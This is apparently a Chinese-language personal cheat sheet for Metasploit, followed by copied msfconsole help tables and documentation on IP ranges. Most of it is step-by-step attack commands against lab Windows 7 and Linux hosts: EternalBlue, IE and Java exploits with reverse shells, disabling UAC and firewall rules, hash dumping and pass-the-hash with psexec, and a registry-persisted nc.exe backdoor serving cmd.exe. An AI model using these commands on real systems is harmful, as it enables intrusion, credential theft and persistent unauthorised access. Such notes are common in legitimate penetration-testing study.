
	https://blog.csdn.net/qq_21310689/article/details/85594699
	
	apt-get  install metasploit-framework

jobs -K 停止所有



```
msfconsole -qr /home/xiaoxiaoran/shell/win.rc
msfconsole -qr /home/xiaoxiaoran/shell/linux.rc
```

```
resource 1.txt
```

```
systemctl restart postgresql  
msfdb init 
db_status
```

```
search name:mysql type:exploit
search platform:mysql   ‍‍缩小查询范围‍‍

```



## mysql扫描空密码

```
search mysql_login
use auxiliary/scanner/mysql/mysql_login 
show options 
set USERnAME root
set BlANK_PASSWORDS true
set rhosts 192.168.100.140
run
```

## ssh信息收集

```
search ssh_version
use auxiliary/scanner/ssh/ssh_version
options
set rhosts 192.168.100.140
run
```

## 利用win7系统的IE浏览器漏洞获取shell

```
use exploit/windows/browser/ms14_064_ole_code_execution
set payload windows/meterpreter/reverse_tcp 
set lhost 192.168.100.143
set LPORT 4444
options
set target 1
run
```

## 使用java7模块getshell

```
use exploit/multi/browser/java_jre17_driver_manager
set payload java/meterpreter/reverse_tcp 
set lhost 192.168.100.143
set LPORT 4444
run
```

## 使用ms17-010漏洞对win7进行

```
Win7防火墙状态关闭   进行扫描确认是否存在漏洞
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.100.129
run

存在MS17-010漏洞下面开始漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.100.129
set payload windows/meterpreter/reverse_tcp 
options
run

查看权限 meterpreter > getuid
```

## 创建一个新用户来远程连接win7桌面

```
meterpreter > run post/windows/manage/enable_rdp
meterpreter > run post/windows/manage/enable_rdp USERNAME=xiaoxiao PASSWORD=123456

sudo rdesktop 192.168.100.129       

```

## 关闭主机防护策略

```shell
shell
	netsh firewall add portopening TCP 4444 "xiaoxiao" ENABLE ALL   
		创建一条防火墙规则允许4444端口访问网络
	cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
		ADD添加一个注册表项 -v创建键值 -t 键值类型 -d 键值的值  关闭UAC(通知用户是否对应用程序使用硬盘驱动器和系统文件授权)
	cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
		开启win7系统主机的默认共享
```

## 使用hash值登录系统

```
meterpreter > hashdump
	xiaoxiao:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::

use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set rhosts 192.168.100.129
set lhost 192.168.100.143
set SMBUser xiaoxiao
set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
set SMBDomain WORKGROUP   //局域网中SMBDomain都是WORKGROUP如果是域用户需要配置域名称。
run
```

## 配置一个后门程序,上传nc到Win7## 

```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\windows\system32
meterpreter > reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
	注册表添加启动项执行nc反弹shell命令   -L 表示用户退出连接后重新进行端口侦听 -d 后台运行 -p 指定端口 -e prog 程序重定向，一旦连接，就执行
shutdown -r -f -t 0
	重启生效 -r 重启 -f 强制 -t 时间 0表示立刻

win7	
	netstat -an
		TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
		
msf6 > connect 192.168.1.56 443
nc -v 192.168.1.56 443

```

## Metapsloit 端口扫描

```
运行的Nmap扫描是一个SYN扫描
nmap -v -sV 192.168.100.0/24 -oA xiaoxiao
	
通过eth0接口在整个子网上运行同一扫描，查找端口80。
use auxiliary/scanner/portscan/syn
set INTERFACE eth0
set PORTS 80
set RHOSTS 192.168.100.0/24
set THREADS 50
run

加载'tcp'扫描器
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.140
run
```



## SMB版本扫描

确定在目标上运行的是哪个版本的Windows，以及哪个Samba版本在Linux主机上。

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.140-141
set THREADS 11
run
```

!!如果我们现在发出hosts命令，则新获取的信息将存储在Metasploit的数据库中。

## 空闲扫描#

Nmap的IPID空闲扫描允许我们在欺骗网络上另一主机的IP地址的同时扫描目标有点隐身。为了使这种类型的扫描能够正常工作，我们需要找到网络上空闲的主机，并使用增量或破碎小端增量的IPID序列。
```
use auxiliary/scanner/ip/ipidseq
set RHOSTS 192.168.100.0/24
set THREADS 50
run
```

[*] 192.168.100.140's IPID sequence class: All zeros
我们的扫描结果来看，我们有一些潜在的僵尸，我们可以用它来执行空闲扫描
尝试使用192.168.100.140上的僵尸来扫描主机
nmap -Pn -sI 192.168.100.140 192.168.100.2

## 用Metasploit查找易受攻击的MSSQL系统

```
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.100.140-141
exploit ```
```

## FTP服务

```sh
use auxiliary/scanner/ftp/ftp_version 
set RHOSTS 192.168.100.140
exploit
```

## 用smb_login扫描访问

常见情况是拥有一个有效的用户名和密码组合，并且想知道你可以在哪里使用它。这是SMB登录检查扫描程序非常有用的地方，因为它将连接到一系列主机并确定用户名/密码组合是否可以访问目标。
```
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.100.129
set SMBUser xiao
set SMBPass xiao
set THREADS 50
run
```



Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on s
                      tartup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24

